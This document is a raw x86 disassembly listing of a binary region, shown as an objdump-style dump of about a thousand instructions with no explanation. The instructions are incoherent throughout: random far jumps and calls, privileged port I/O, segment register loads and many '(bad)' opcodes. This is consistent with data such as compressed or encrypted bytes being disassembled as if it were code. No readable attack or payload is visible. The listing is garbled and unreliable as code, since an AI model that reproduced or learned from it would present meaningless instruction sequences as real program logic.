  4274b3:	jmp    0x69f:0x2d7d01ec
  4274ba:	lock fbstp TBYTE PTR [ecx+edx*2]
  4274be:	dec    ebx
  4274bf:	or     eax,0xffffff97
  4274c2:	mov    eax,0x2790ca27
  4274c7:	popa   
  4274c8:	mov    ds:0x15826c63,eax
  4274cd:	dec    ecx
  4274ce:	pop    edx
  4274cf:	adc    ecx,DWORD PTR [ebp-0x2c]
  4274d2:	xor    esi,DWORD PTR [ebx+0x5c]
  4274d5:	adc    al,0x95
  4274d7:	call   0x4038:0x5b39facd
  4274de:	ror    DWORD PTR [ebx-0x1d9f9563],1
  4274e4:	out    0x12,al
  4274e6:	and    eax,0x6ea87a52
  4274eb:	outs   dx,BYTE PTR ds:[esi]
  4274ec:	cmp    BYTE PTR [eax+0x6c],0xe2
  4274f0:	mov    esp,0x4c04ca2d
  4274f5:	sti    
  4274f6:	push   edx
  4274f7:	xor    eax,DWORD PTR [edx+0x7bfaab99]
  4274fd:	sahf   
  4274fe:	add    eax,0xbf3e4fe3
  427503:	add    ebp,DWORD PTR [ebp+0x7026a08]
  427509:	sti    
  42750a:	mov    dh,BYTE PTR [edx+0x7e61ec94]
  427510:	mov    ss,ebp
  427512:	leave  
  427513:	jp     0x4274fe
  427515:	sub    eax,0x47041279
  42751a:	xchg   ecx,eax
  42751b:	out    0x7,al
  42751d:	gs adc eax,0xdd5f444a
  427523:	cmc    
  427524:	xor    al,0x44
  427526:	cli    
  427527:	shl    DWORD PTR [edi+0x2930df32],0x39
  42752e:	stos   BYTE PTR es:[edi],al
  42752f:	aad    0xcf
  427531:	arpl   WORD PTR [edx],bp
  427533:	xchg   edi,eax
  427534:	popa   
  427535:	ja     0x4274d4
  427537:	xchg   edx,eax
  427538:	ja     0x42753c
  42753a:	sbb    dh,BYTE PTR [ebx+0x7c93fbf0]
  427540:	dec    esp
  427541:	dec    esp
  427542:	retf   0xb6c6
  427545:	loopne 0x4274ed
  427547:	int    0x23
  427549:	rcr    BYTE PTR [ebp+0x25],cl
  42754c:	ds push 0xa0a4fb75
  427552:	pop    edx
  427553:	jmp    0x1541:0x6c9b69b0
  42755a:	xchg   ecx,eax
  42755b:	fadd   QWORD PTR [ebx]
  42755d:	jl     0x42751c
  42755f:	loopne 0x4275db
  427561:	test   BYTE PTR [ebp-0x44],dl
  427564:	nop
  427565:	(bad)  
  427566:	pop    ss
  427567:	ds push 0x60e7fce3
  42756d:	xchg   esp,eax
  42756e:	dec    eax
  42756f:	jae    0x4275d7
  427571:	mov    esi,0x500aee9b
  427576:	(bad)  
  427577:	(bad)  
  427578:	leave  
  427579:	and    DWORD PTR [eax],0x66
  42757c:	jnp    0x427540
  42757e:	dec    esp
  42757f:	sti    
  427580:	jo     0x427556
  427582:	stos   BYTE PTR es:[edi],al
  427583:	jnp    0x4275c7
  427585:	pop    ss
  427586:	or     al,0x93
  427588:	inc    edi
  427589:	and    BYTE PTR [ecx+edx*4-0x7fac69e4],dh
  427590:	cld    
  427591:	(bad)  
  427592:	icebp  
  427593:	dec    DWORD PTR [edi]
  427595:	es mov dh,0xb
  427598:	add    DWORD PTR [ecx+0x7395e6c8],edi
  42759e:	add    ebx,ecx
  4275a0:	mov    bh,0x4d
  4275a2:	aaa    
  4275a3:	enter  0x6220,0x94
  4275a7:	push   eax
  4275a8:	adc    BYTE PTR [esi+0x43],dl
  4275ab:	jmp    0xd64e:0xb04a8457
  4275b2:	ja     0x427632
  4275b4:	test   DWORD PTR [eax-0x3a],0x78762dfe
  4275bb:	pop    esp
  4275bc:	fsubr  QWORD PTR [ebx]
  4275be:	pop    edx
  4275bf:	mov    eax,0xa7b71715
  4275c4:	(bad)  
  4275c5:	enter  0x94ca,0xfa
  4275c9:	fcmovnbe st,st(2)
  4275cb:	jp     0x4275e7
  4275cd:	jns    0x4275f7
  4275cf:	adc    BYTE PTR [edx],dh
  4275d1:	imul   esi,DWORD PTR [eax-0x7e8e672],0xb9eb6292
  4275db:	aad    0x2d
  4275dd:	push   DWORD PTR [edx+ecx*2+0x454c50a1]
  4275e4:	xchg   ecx,eax
  4275e5:	inc    ebp
  4275e6:	dec    edx
  4275e7:	loopne 0x4275e7
  4275e9:	int3   
  4275ea:	fistp  QWORD PTR [esi+0x6d52c93a]
  4275f0:	mov    edi,0x5685fde
  4275f5:	sbb    bl,BYTE PTR [ebx+0x7d]
  4275f8:	out    dx,al
  4275f9:	mov    edi,0xa76e9eba
  4275fe:	stos   BYTE PTR es:[edi],al
  4275ff:	out    dx,eax
  427600:	js     0x42758c
  427602:	ret    0xdbd2
  427605:	test   eax,edi
  427607:	pop    eax
  427608:	jmp    0x12088243
  42760d:	xor    ch,BYTE PTR cs:[ecx+0xe]
  427611:	add    esp,esp
  427613:	sar    DWORD PTR [esi],cl
  427615:	std    
  427616:	loope  0x427647
  427618:	and    eax,0x950d761c
  42761d:	jecxz  0x427699
  42761f:	xchg   bl,ah
  427621:	push   DWORD PTR ds:0x9bc95ba2
  427627:	xchg   ebp,eax
  427628:	popa   
  427629:	inc    ecx
  42762a:	ret    
  42762b:	ret    0xb31d
  42762e:	xor    al,0x5c
  427630:	in     al,dx
  427631:	popa   
  427632:	sub    BYTE PTR [ebp+0x4c],bh
  427635:	lahf   
  427636:	dec    eax
  427637:	mov    eax,ds:0x55d54e3a
  42763c:	cs loopne 0x4275fe
  42763f:	sub    al,0x6c
  427641:	ins    BYTE PTR es:[edi],dx
  427642:	test   DWORD PTR ds:0x923c7451,ecx
  427648:	pop    ebp
  427649:	adc    cl,BYTE PTR [ecx]
  42764b:	push   cs
  42764c:	jbe    0x427690
  42764e:	cmp    BYTE PTR [esi+esi*1],cl
  427651:	mov    ah,0x2f
  427653:	inc    eax
  427654:	xchg   esp,eax
  427655:	push   0xa2cd0c38
  42765a:	sbb    eax,0xb9965dbe
  42765f:	mov    ebx,DWORD PTR [ecx-0x6053cca9]
  427665:	lea    ebp,ds:0xc5628622
  42766b:	js     0x4276b6
  42766d:	(bad)  
  42766e:	push   eax
  42766f:	jo     0x427690
  427671:	call   0xd601:0x18eafdd3
  427678:	or     eax,0x9e6439cd
  42767d:	push   0x5b
  42767f:	or     al,0x67
  427681:	fdivrp st(7),st
  427683:	(bad)  
  427684:	mov    BYTE PTR [ebx+0x7cd1b63c],0x20
  42768b:	test   BYTE PTR [esi],dh
  42768d:	mov    DWORD PTR [edx],esp
  42768f:	adc    esp,edx
  427691:	rcl    DWORD PTR [edx+ebp*2-0x396b211f],cl
  427698:	jbe    0x4276db
  42769a:	cli    
  42769b:	adc    DWORD PTR [edx-0x3d],ecx
  42769e:	jmp    0x58c985b3
  4276a3:	ret    0x529
  4276a6:	xchg   DWORD PTR [eax+0x64],edi
  4276a9:	retf   
  4276aa:	ret    
  4276ab:	nop
  4276ac:	ins    BYTE PTR es:[edi],dx
  4276ad:	pushf  
  4276ae:	xchg   esp,eax
  4276af:	mov    esp,0x7eb1c029
  4276b4:	es dec edx
  4276b6:	push   ss
  4276b7:	(bad)  
  4276b8:	mov    bh,0xe6
  4276ba:	or     ecx,ecx
  4276bc:	or     al,BYTE PTR [edx-0x5fd6a118]
  4276c2:	adc    BYTE PTR [edi+0x1a11da96],bl
  4276c8:	pop    ss
  4276c9:	into   
  4276ca:	aas    
  4276cb:	cbw    
  4276cd:	dec    edx
  4276ce:	pushf  
  4276cf:	inc    ecx
  4276d0:	sbb    bh,BYTE PTR cs:[edx+edx*2-0x31bd47df]
  4276d8:	rcl    esp,0x8f
  4276db:	inc    esp
  4276dc:	jle    0x427746
  4276de:	fistp  WORD PTR [ebx+ebx*4]
  4276e1:	pop    ds
  4276e2:	sbb    eax,0x3e12e90a
  4276e7:	test   DWORD PTR [edi],ebx
  4276e9:	std    
  4276ea:	xor    al,0x6f
  4276ec:	mov    ds:0x2be81eb,al
  4276f1:	or     BYTE PTR [esi],al
  4276f3:	mov    esi,0xe7ca489
  4276f8:	mov    ebx,0xff3d4db2
  4276fd:	xchg   eax,edi
  4276ff:	push   ss
  427700:	dec    esi
  427701:	and    BYTE PTR [ebx-0x44],dl
  427704:	cmp    cl,bl
  427706:	aam    0x9b
  427708:	cmp    al,0x6d
  42770a:	mov    eax,0x792356f
  42770f:	mov    bh,0x27
  427711:	pop    edx
  427712:	or     dh,BYTE PTR [esi]
  427714:	std    
  427715:	xchg   edi,eax
  427716:	dec    edi
  427717:	cmp    ah,BYTE PTR [esi]
  427719:	lahf   
  42771a:	stos   BYTE PTR es:[edi],al
  42771b:	dec    esi
  42771c:	ja     0x42777f
  42771e:	pop    edx
  42771f:	xchg   ecx,eax
  427720:	inc    ecx
  427721:	fst    DWORD PTR [ebp-0x7011aaa7]
  427727:	iret   
  427728:	ss adc al,0x58
  42772b:	fidiv  DWORD PTR [ebp-0x280533e3]
  427731:	inc    edi
  427732:	into   
  427733:	in     al,0x9e
  427735:	sub    al,0x89
  427737:	loop   0x427711
  427739:	test   BYTE PTR [ebx-0x76],0x86
  42773d:	ja     0x4276c2
  42773f:	pop    edi
  427740:	nop
  427741:	lahf   
  427742:	and    bl,ah
  427744:	(bad)  
  427745:	popf   
  427746:	jp     0x427753
  427748:	addr16 jbe 0x42774a
  42774b:	mov    al,ds:0xd10af7ae
  427750:	xor    al,0x40
  427752:	leave  
  427753:	mov    dh,BYTE PTR [eax+0x62b29d78]
  427759:	fsubr  st(7),st
  42775b:	adc    ebp,DWORD PTR [edx-0x59]
  42775e:	stos   BYTE PTR es:[edi],al
  42775f:	sbb    BYTE PTR [edi+0x71],bl
  427762:	int    0x7d
  427764:	sub    eax,0x7d7e206f
  427769:	int3   
  42776a:	push   ss
  42776b:	rcl    BYTE PTR [esi-0xb],1
  42776e:	shl    DWORD PTR [esi+0x29],1
  427771:	out    0xf6,eax
  427773:	mov    bl,0xea
  427775:	jecxz  0x427709
  427777:	cmp    al,0x55
  427779:	popa   
  42777a:	cs push ecx
  42777c:	pop    ebp
  42777d:	mov    dh,0x4e
  42777f:	shl    BYTE PTR [edi-0x76],0x8
  427783:	retf   
  427784:	cmp    al,0xef
  427786:	sub    dh,ch
  427788:	fdivp  st(4),st
  42778a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42778b:	das    
  42778c:	outs   dx,BYTE PTR ds:[esi]
  42778d:	or     ebx,DWORD PTR [eax+0x5719da67]
  427793:	jbe    0x427778
  427795:	and    al,0x9b
  427797:	shr    al,cl
  427799:	and    al,0x6a
  42779b:	pop    esi
  42779c:	mov    dh,BYTE PTR [ebp+0x285e614f]
  4277a2:	ja     0x4277f7
  4277a4:	mov    edi,DWORD PTR [ebx]
  4277a6:	dec    esi
  4277a7:	and    dh,bh
  4277a9:	loop   0x42777a
  4277ab:	xor    ebp,DWORD PTR [edx-0x1c0a7395]
  4277b1:	xor    DWORD PTR [edi+0xf2],ecx
	...
  4277bf:	add    BYTE PTR [eax],al
  4277c1:	sub    al,0x44
  4277c3:	and    edi,DWORD PTR [eax+0x6b]
  4277c6:	jg     0x427847
  4277c8:	push   esp
  4277c9:	adc    edi,DWORD PTR [ebp-0x2bab5d8a]
  4277cf:	adc    ah,BYTE PTR [edi]
  4277d1:	js     0x4277c0
  4277d3:	add    DWORD PTR [eax],eax
  4277d5:	stos   DWORD PTR es:[edi],eax
  4277d6:	add    eax,DWORD PTR [eax]
  4277d8:	add    BYTE PTR [ebp+0x2659a76],al
  4277de:	pop    es
  4277df:	jp     0x42778f
  4277e1:	pop    edi
  4277e2:	in     eax,0xc5
  4277e4:	in     eax,0xc7
  4277e6:	aad    0x4
  4277e8:	mov    al,ds:0xfad2d996
  4277ed:	xor    al,al
  4277ef:	sbb    DWORD PTR [ecx-0x45],0xbb502fd9
  4277f6:	pop    edi
  4277f7:	aas    
  4277f8:	sar    DWORD PTR [ebp+0x11],1
  4277fb:	popa   
  4277fc:	into   
  4277fd:	scas   eax,DWORD PTR es:[edi]
  4277fe:	arpl   WORD PTR [ebp+0x5f3e5f31],bx
  427804:	(bad)  
  427805:	jo     0x427835
  427807:	mov    DWORD PTR [edx],ebx
  427809:	data16 adc BYTE PTR ds:0xda3c3612,dh
  427810:	mov    ds,edi
  427812:	sub    eax,0xd479958f
  427817:	sbb    bl,BYTE PTR [edi+0x60227ef8]
  42781d:	sub    al,BYTE PTR gs:[eax]
  427820:	and    BYTE PTR [edx+0x205c3f6d],0xb6
  427827:	jg     0x4277fc
  427829:	fld    QWORD PTR [edi]
  42782b:	sub    eax,0xdd233e62
  427830:	adc    edi,DWORD PTR [eax]
  427832:	daa    
  427833:	in     eax,0xb9
  427835:	push   esp
  427836:	mov    ?,WORD PTR ds:0x127d3f05
  42783c:	int    0x53
  42783e:	fsubr  DWORD PTR [ebx+0x7218edce]
  427844:	aam    0x62
  427846:	inc    esp
  427847:	wbinvd 
  427849:	dec    edx
  42784a:	mov    esi,0x33a66a3d
  42784f:	daa    
  427850:	sub    al,0x8
  427852:	mov    bl,0xc9
  427854:	scas   al,BYTE PTR es:[edi]
  427855:	ins    DWORD PTR es:[edi],dx
  427856:	and    eax,ebx
  427858:	sbb    al,0x22
  42785a:	rol    DWORD PTR [ecx],0x80
  42785d:	lods   eax,DWORD PTR ds:[esi]
  42785e:	adc    DWORD PTR [ebp+0x29fc41d3],edi
  427864:	cld    
  427865:	ss xchg esi,eax
  427867:	pushf  
  427868:	retf   
  427869:	mov    bh,0x5d
  42786b:	in     eax,dx
  42786c:	xor    eax,0x3bbf5540
  427871:	mov    WORD PTR [ebx],es
  427873:	pop    ebx
  427874:	loop   0x427843
  427876:	xchg   BYTE PTR [eax-0x32],dl
  427879:	push   eax
  42787a:	push   esp
  42787b:	pop    ds
  42787c:	mov    dl,0x8a
  42787e:	dec    esi
  42787f:	mov    ebp,0x69c6dcb3
  427884:	in     al,dx
  427885:	xor    esi,DWORD PTR [edi+0x62a6effc]
  42788b:	sub    ah,bl
  42788d:	jl     0x4278de
  42788f:	stos   DWORD PTR es:[edi],eax
  427890:	mov    ds:0x7d425a83,eax
  427895:	loopne 0x4278e7
  427897:	jno    0x4278ae
  427899:	fcomp  QWORD PTR [eax]
  42789b:	std    
  42789c:	inc    esp
  42789d:	jo     0x4278db
  42789f:	xlat   BYTE PTR ds:[ebx]
  4278a0:	jl     0x42785c
  4278a2:	push   edi
  4278a3:	test   BYTE PTR [ecx],dl
  4278a5:	sub    ecx,DWORD PTR [edx-0x4453fd44]
  4278ab:	adc    ch,BYTE PTR [ebx+0x29]
  4278ae:	cmp    esi,DWORD PTR [edi]
  4278b0:	xor    BYTE PTR [ebx+0xd7f8339],0xd3
  4278b7:	or     eax,0xeb261634
  4278bc:	mov    dh,0x7d
  4278be:	imul   esp,DWORD PTR [ebx+0x44f87cb8],0xffffff8d
  4278c5:	or     edx,DWORD PTR [edx+ebp*4-0x3e]
  4278c9:	inc    ecx
  4278ca:	mov    bl,0x70
  4278cc:	iret   
  4278cd:	dec    ecx
  4278ce:	jbe    0x4278a1
  4278d0:	outs   dx,DWORD PTR ds:[esi]
  4278d1:	fst    DWORD PTR [esi-0x705608ae]
  4278d7:	lea    esp,[edx]
  4278d9:	mov    ch,0x8e
  4278db:	ficom  WORD PTR [esi]
  4278dd:	pop    ss
  4278de:	push   esi
  4278df:	cmp    dl,BYTE PTR [edi]
  4278e1:	pop    ecx
  4278e2:	or     BYTE PTR [ebp+0x1d],dl
  4278e5:	ins    BYTE PTR es:[edi],dx
  4278e6:	mov    esp,esi
  4278e8:	pop    ss
  4278e9:	lods   eax,DWORD PTR ds:[esi]
  4278ea:	dec    edi
  4278eb:	pop    edi
  4278ec:	ins    DWORD PTR es:[edi],dx
  4278ed:	pop    ebx
  4278ee:	xor    DWORD PTR [edx+0x1e],0xffffff83
  4278f2:	push   esi
  4278f3:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4278f5:	sub    BYTE PTR [esi],ah
  4278f7:	std    
  4278f8:	stos   DWORD PTR es:[edi],eax
  4278f9:	fistp  DWORD PTR [esi+edx*2-0x3cbd4b5]
  427900:	dec    eax
  427901:	sub    BYTE PTR [eax+edi*1+0x3d0099fd],ch
  427908:	icebp  
  427909:	scas   al,BYTE PTR es:[edi]
  42790a:	fnstcw WORD PTR [esi+0x2b763efd]
  427910:	cmc    
  427911:	pop    ss
  427912:	and    al,0xc
  427914:	pushf  
  427915:	jb     0x427970
  427917:	sbb    BYTE PTR [edi],al
  427919:	je     0xa00afc5
  42791f:	mov    esi,0x96564b85
  427924:	cdq    
  427925:	arpl   WORD PTR [ebx],sp
  427927:	aas    
  427928:	lock (bad) 
  42792a:	dec    esp
  42792b:	pop    edi
  42792c:	ror    DWORD PTR [edi+esi*4],cl
  42792f:	sub    DWORD PTR [ebp+0x3d8bb061],esi
  427935:	mov    bl,0x1d
  427937:	repnz adc DWORD PTR [esi],ecx
  42793a:	jne    0x4279ba
  42793c:	sub    edi,DWORD PTR [ecx]
  42793e:	ins    DWORD PTR es:[edi],dx
  42793f:	jp     0x427957
  427941:	fincstp 
  427943:	dec    eax
  427944:	pop    ebx
  427945:	xchg   ebp,edx
  427947:	jnp    0x427955
  427949:	test   al,0xef
  42794b:	push   0x9e799dae
  427950:	lock aam 0x5
  427953:	mov    ch,0xdc
  427955:	pop    ds
  427956:	inc    eax
  427957:	mov    fs,WORD PTR [edx+0x33]
  42795a:	inc    BYTE PTR [ebx-0xfb6830]
  427960:	shl    DWORD PTR [edi-0x6ab37c16],0x83
  427967:	lds    esi,FWORD PTR [ecx]
  427969:	lea    ecx,[ebp+0x20]
  42796c:	xor    eax,DWORD PTR [ecx]
  42796e:	in     eax,dx
  42796f:	mov    edx,0xeb0ce6f1
  427974:	push   cs
  427975:	xchg   edi,eax
  427976:	jne    0x427912
  427978:	rcr    ebx,cl
  42797a:	pop    ebp
  42797b:	fstp   TBYTE PTR ds:0xb5f08a4b
  427981:	cmp    BYTE PTR [eax],bh
  427983:	mov    ecx,0xb789b5f4
  427988:	xchg   DWORD PTR [edi+ebx*8],esi
  42798b:	mov    ebx,0x266cc207
  427990:	imul   esp,DWORD PTR ds:0x51c6201e,0x7e66a9eb
  42799a:	into   
  42799b:	test   eax,0x2dec831b
  4279a0:	stos   BYTE PTR es:[edi],al
  4279a1:	xchg   esi,eax
  4279a2:	pop    edx
  4279a3:	fadd   st,st(4)
  4279a5:	sbb    DWORD PTR [edx-0x62],0xffffffdd
  4279a9:	fnstenv [edx+0x3c6ee64e]
  4279af:	clc    
  4279b0:	icebp  
  4279b1:	setg   BYTE PTR fs:[esi+eax*2+0x50]
  4279b7:	mov    edx,0x56323736
  4279bc:	int3   
  4279bd:	pop    esi
  4279be:	xlat   BYTE PTR ds:[ebx]
  4279bf:	(bad)  
  4279c0:	adc    DWORD PTR [ecx-0x7fe98c8],ebx
  4279c6:	xor    al,0x9c
  4279c8:	(bad)  
  4279c9:	xchg   esi,eax
  4279ca:	jg     0x427989
  4279cc:	pop    ds
  4279cd:	stc    
  4279ce:	xchg   ebp,eax
  4279cf:	in     al,0xa8
  4279d1:	(bad)  
  4279d2:	push   ecx
  4279d3:	add    DWORD PTR [edi-0x7],eax
  4279d6:	sub    dl,BYTE PTR [edi+0x68]
  4279d9:	jge    0x4279d7
  4279db:	xchg   ebp,eax
  4279dc:	dec    ebx
  4279dd:	xchg   esi,eax
  4279de:	push   edi
  4279df:	stos   BYTE PTR es:[edi],al
  4279e0:	scas   al,BYTE PTR es:[edi]
  4279e1:	push   esi
  4279e2:	(bad)  
  4279e3:	hlt    
  4279e4:	mov    bl,0xf7
  4279e6:	mov    edi,0xa406640a
  4279eb:	iret   
  4279ec:	outs   dx,BYTE PTR ds:[esi]
  4279ed:	pop    eax
  4279ee:	mov    ds:0x28c224aa,al
  4279f3:	add    DWORD PTR [ecx],esp
  4279f5:	mov    esp,0x9b1811ab
  4279fa:	test   BYTE PTR [edx+0x484571cc],al
  427a00:	jge    0x4279b4
  427a02:	xor    edx,edi
  427a04:	add    ebx,DWORD PTR [esi]
  427a06:	xchg   edx,eax
  427a07:	sub    dl,BYTE PTR [ebx]
  427a09:	push   esi
  427a0a:	std    
  427a0b:	mov    ebp,0x4087052c
  427a10:	test   BYTE PTR [eax+0x68],dh
  427a13:	lods   al,BYTE PTR ds:[esi]
  427a14:	push   ebx
  427a15:	mov    ebx,0xe2543c09
  427a1a:	push   ecx
  427a1b:	ficom  DWORD PTR [ecx+0x1bb29369]
  427a21:	or     ah,BYTE PTR ds:0x26e127c5
  427a27:	fiadd  DWORD PTR [ecx+ecx*8+0x6a]
  427a2b:	gs push esp
  427a2d:	sub    DWORD PTR [edi-0x40],ecx
  427a30:	pushf  
  427a31:	aad    0x8a
  427a33:	pop    esi
  427a34:	xlat   BYTE PTR ds:[ebx]
  427a35:	scas   eax,DWORD PTR es:[edi]
  427a36:	add    BYTE PTR [edx+0x526e0ff8],ch
  427a3c:	ret    
  427a3d:	js     0x427a0f
  427a3f:	sbb    BYTE PTR [ebx+0x38],al
  427a42:	dec    ecx
  427a43:	je     0x4279f5
  427a45:	sub    ebx,DWORD PTR [edx]
  427a47:	push   ds
  427a48:	(bad)  
  427a49:	sub    al,0x41
  427a4b:	dec    esi
  427a4c:	xor    ch,dl
  427a4e:	lds    ebp,FWORD PTR [ebx]
  427a50:	pop    edx
  427a51:	fldenv ds:0xe3fdd7c0
  427a57:	lds    ebp,FWORD PTR [ebx+0x38d8bea4]
  427a5d:	out    0x5,al
  427a5f:	or     BYTE PTR [ebp-0x7d2a409f],al
  427a65:	nop
  427a66:	mov    edi,0x6f594784
  427a6b:	out    0xb6,al
  427a6d:	mov    ah,0xaa
  427a6f:	push   cs
  427a70:	adc    ch,BYTE PTR [ebx-0x7d]
  427a73:	jne    0x427a70
  427a75:	or     eax,0xfdc0dabc
  427a7a:	cwde   
  427a7b:	fisubr WORD PTR [ecx+0x2a512bc8]
  427a81:	ret    0xf1df
  427a84:	ins    BYTE PTR es:[edi],dx
  427a85:	and    al,dh
  427a87:	loop   0x427ada
  427a89:	nop
  427a8a:	push   eax
  427a8b:	ins    BYTE PTR es:[edi],dx
  427a8c:	cmp    BYTE PTR [ebx],bh
  427a8e:	cld    
  427a8f:	imul   DWORD PTR [ecx-0x73e375a6]
  427a95:	push   edi
  427a96:	jb     0xa158ca64
  427a9c:	in     eax,dx
  427a9d:	rol    BYTE PTR [edx-0x6e],cl
  427aa0:	call   0xf158:0xf5c97ebf
  427aa7:	int    0xa3
  427aa9:	lock sti 
  427aab:	xor    DWORD PTR [edi+ebp*4],ecx
  427aae:	adc    dh,dh
  427ab0:	ret    0xcc00
  427ab3:	xor    ah,al
  427ab5:	cmc    
  427ab6:	pop    edi
  427ab7:	bound  esi,QWORD PTR [ebp-0x403bd728]
  427abd:	bound  esp,QWORD PTR [edi+ecx*4+0x6b34c112]
  427ac4:	jnp    0x427a80
  427ac6:	mov    eax,0xce093b07
  427acb:	add    al,0x48
  427acd:	data16 ins BYTE PTR es:[edi],dx
  427acf:	scas   al,BYTE PTR es:[edi]
  427ad0:	pop    ebx
  427ad1:	or     eax,0x52d60c5b
  427ad6:	inc    esp
  427ad7:	ror    DWORD PTR ds:0x87292445,0x18
  427ade:	aaa    
  427adf:	mov    ah,0x4c
  427ae1:	mov    ebx,0xb94c0a4d
  427ae6:	inc    ebp
  427ae7:	jb     0x427b44
  427ae9:	in     al,0x9f
  427aeb:	push   0xffffffb5
  427aed:	mov    ebx,0x1acca614
  427af2:	mov    ds:0x10c996d,al
  427af7:	lahf   
  427af8:	adc    DWORD PTR [ecx+0x55],0x2dd9ede4
  427aff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427b00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427b01:	jne    0x427acc
  427b03:	push   cs
  427b04:	std    
  427b05:	setns  al
  427b08:	ins    BYTE PTR es:[edi],dx
  427b09:	lods   al,BYTE PTR ds:[esi]
  427b0a:	push   es
  427b0b:	loop   0x427aa8
  427b0d:	jl     0x427a9e
  427b0f:	jge    0x427a92
  427b11:	test   eax,0xd8cb52cd
  427b16:	jge    0x427aa5
  427b18:	cld    
  427b19:	in     eax,dx
  427b1a:	sbb    DWORD PTR [ebx+0x1b],0x3a
  427b1e:	inc    eax
  427b1f:	iret   
  427b20:	xor    bh,BYTE PTR [esi+eiz*2+0x6ad8329d]
  427b27:	fisttp DWORD PTR es:[ecx]
  427b2a:	fs in  eax,dx
  427b2c:	cmp    ebx,edx
  427b2e:	add    eax,0xe96ae2d8
  427b33:	(bad)  
  427b34:	push   esi
  427b35:	jb     0x427b5d
  427b37:	pop    edx
  427b38:	mov    cl,0xf
  427b3a:	mov    ah,0xd8
  427b3c:	push   ebp
  427b3d:	sub    DWORD PTR [ebx+0x734b8ecd],ebx
  427b43:	inc    ebp
  427b44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427b45:	xchg   dl,ch
  427b47:	cld    
  427b48:	jg     0x427b42
  427b4a:	add    al,0x2e
  427b4c:	out    dx,al
  427b4d:	aas    
  427b4e:	pop    esp
  427b4f:	jns    0x427b78
  427b51:	xchg   edi,eax
  427b52:	enter  0x76ef,0x26
  427b56:	xchg   ebx,eax
  427b57:	imul   esp,DWORD PTR [ebx],0xfb2d0db2
  427b5d:	cwde   
  427b5e:	imul   ebp,DWORD PTR ds:0x32899a1,0x3a
  427b65:	add    dl,BYTE PTR [ebx-0x23]
  427b68:	outs   dx,BYTE PTR ds:[esi]
  427b69:	repnz push edx
  427b6b:	cwde   
  427b6c:	out    dx,eax
  427b6d:	mov    DWORD PTR ds:0xe1db9745,ecx
  427b73:	xor    bh,al
  427b75:	adc    ah,BYTE PTR [esi]
  427b77:	mov    esi,0x4f8f080b
  427b7d:	fwait
  427b7e:	sar    DWORD PTR [edx+0x7cf1f38],1
	...
  427b90:	add    BYTE PTR [ebx],ch
  427b92:	loopne 0x427c0f
  427b94:	cmp    bl,bh
  427b96:	mov    ebx,0x345ef36b
  427b9b:	aaa    
  427b9c:	mov    DWORD PTR [ebx+0x23c12e7d],ebx
  427ba2:	icebp  
  427ba3:	add    DWORD PTR [eax],eax
  427ba5:	stos   DWORD PTR es:[edi],eax
  427ba6:	add    eax,DWORD PTR [eax]
  427ba8:	add    BYTE PTR [edx+0x1d447f52],dh
  427bae:	xchg   edx,eax
  427baf:	aas    
  427bb0:	rcl    BYTE PTR [ecx+0x423b7b59],cl
  427bb6:	adc    eax,0xf3df6dc6
  427bbb:	jmp    0xec3d1297
  427bc0:	mov    ebx,?
  427bc2:	adc    ecx,DWORD PTR es:[edx]
  427bc5:	add    ah,bh
  427bc7:	cmp    ebx,esi
  427bc9:	test   eax,0x66fed84b
  427bce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427bcf:	outs   dx,DWORD PTR ds:[esi]
  427bd0:	fidiv  WORD PTR [edx+0x4b640782]
  427bd6:	cmp    BYTE PTR [edx+0x69],bh
  427bd9:	stos   DWORD PTR es:[edi],eax
  427bda:	je     0x427c24
  427bdc:	dec    esp
  427bdd:	mov    cl,0x97
  427bdf:	pop    es
  427be0:	mov    bh,0xb9
  427be2:	mov    cs,eax
  427be4:	rol    BYTE PTR [ecx+ebx*2],0x3
  427be8:	push   0xf8c5bccc
  427bed:	jbe    0x427c13
  427bef:	pop    es
  427bf0:	les    ebp,FWORD PTR [eax-0x33f969d7]
  427bf6:	in     eax,dx
  427bf7:	mov    bh,BYTE PTR [esi-0x36]
  427bfa:	adc    al,BYTE PTR [edi]
  427bfc:	adc    eax,0xaa0c2683
  427c01:	cmp    BYTE PTR [esi-0x6bedc0df],bl
  427c07:	(bad)  
  427c08:	push   ss
  427c09:	stos   DWORD PTR es:[edi],eax
  427c0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427c0b:	adc    BYTE PTR [ecx-0x12],dh
  427c0e:	(bad)  
  427c0f:	cmp    DWORD PTR [ebx],edx
  427c11:	aad    0x9d
  427c13:	and    esp,DWORD PTR [ecx-0x2c6b02ea]
  427c19:	or     BYTE PTR [ecx+0x8044272],0x34
  427c20:	dec    ebx
  427c21:	mov    bh,BYTE PTR [ecx-0x1f]
  427c24:	test   eax,edi
  427c26:	mov    esi,0x5a8a7a3d
  427c2b:	mov    ch,BYTE PTR [ebx-0x2d]
  427c2e:	call   0x3406:0xe17e3dbc
  427c35:	cld    
  427c36:	xchg   esi,eax
  427c37:	dec    ecx
  427c38:	lahf   
  427c39:	lea    ebp,[ecx-0x3e]
  427c3c:	test   DWORD PTR [edx-0x19],esi
  427c3f:	xor    BYTE PTR [edi+0x2c],bh
  427c42:	jl     0x427c21
  427c44:	and    ebp,edi
  427c46:	sbb    ch,BYTE PTR [edi+ebp*2]
  427c49:	test   al,0xf6
  427c4b:	into   
  427c4c:	loopne 0x427c3f
  427c4e:	dec    esi
  427c4f:	ret    0x4ee0
  427c52:	in     eax,0xec
  427c54:	repnz outs dx,BYTE PTR ds:[esi]
  427c56:	(bad)  
  427c57:	out    0x10,eax
  427c59:	sar    BYTE PTR [ebp-0x5a07f2f6],cl
  427c5f:	ja     0x427cd6
  427c61:	mov    fs,WORD PTR [ebp+0x0]
  427c64:	(bad)  
  427c65:	pop    eax
  427c66:	mov    esp,0x2c592bf
  427c6b:	and    ebx,ebx
  427c6d:	test   eax,0x7d48d276
  427c72:	ret    
  427c73:	push   eax
  427c74:	mov    cs,WORD PTR [edx+0x57]
  427c77:	mov    esp,0x24682eee
  427c7c:	inc    ebx
  427c7d:	cmp    ebp,ebp
  427c7f:	xchg   ecx,eax
  427c80:	adc    bh,BYTE PTR [eax-0x4f]
  427c83:	mov    esi,0xf05374a5
  427c88:	lds    edi,FWORD PTR [eax-0x1ba3ce5a]
